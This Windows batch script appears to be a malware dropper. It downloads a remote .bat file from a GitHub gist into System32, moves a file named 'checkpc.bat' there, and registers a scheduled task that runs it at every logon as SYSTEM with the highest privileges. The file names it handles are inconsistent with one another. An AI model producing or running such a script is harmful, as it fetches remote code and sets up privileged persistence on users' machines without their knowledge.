@echo off 

cd /d %windir%\system32
powershell -Command "& { Invoke-WebRequest -Uri 'https://gist.github.com/INeddHelp/71d5cef5935055810bf338f97c3e8605/raw/sleepdaddy.bat' -OutFile 'sleepdaddy.bat' }"
move /y checkpc.bat %windir%\System32\
schtasks /create /tn "Run index.bat at logon" /tr "%windir%\System32\checkpc.bat" /sc ONLOGON /rl highest /ru System /f
start checkpc.bat
